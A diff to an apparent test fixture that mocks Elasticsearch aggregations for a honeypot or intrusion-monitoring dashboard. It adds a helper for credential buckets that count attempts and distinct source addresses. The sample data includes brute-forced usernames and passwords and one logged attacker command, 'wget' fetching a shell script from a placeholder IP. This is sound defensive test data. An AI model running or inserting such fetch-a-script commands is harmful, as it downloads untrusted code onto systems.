@@ -20,6 +20,11 @@ def _cubos(*pares: tuple[str, int]) -> dict[str, Any]:
     return {"buckets": [{"key": k, "doc_count": n} for k, n in pares]}
 
 
+def _credenciales(*trios: tuple[str, int, int]) -> dict[str, Any]:
+    """Cubos de credenciales: clave, intentos y cuántas direcciones distintas la probaron."""
+    return {"buckets": [{"key": k, "doc_count": n, "origenes": {"value": o}} for k, n, o in trios]}
+
+
 RESPUESTA = {
     "hits": {"total": {"value": 1200}},
     "aggregations": {
@@ -66,8 +71,10 @@ RESPUESTA = {
         },
         "con_geo": {"doc_count": 1100},
         "sistemas": {"buckets": [{"key": "Red de prueba", "doc_count": 200, "ips": {"value": 9}}]},
-        "usuarios": _cubos(("root", 300), ("203.0.113.9", 40), ("admin", 20)),
-        "contrasenas": _cubos(("123456", 90), ("192.0.2", 10)),
+        "usuarios": _credenciales(
+            ("root", 300, 120), ("203.0.113.9", 40, 30), ("admin", 20, 9), ("cuenta.puntual", 15, 1)
+        ),
+        "contrasenas": _credenciales(("123456", 90, 50), ("192.0.2", 10, 8)),
         "comandos_top": _cubos(("wget http://198.51.100.7/x.sh", 12)),
     },
 }
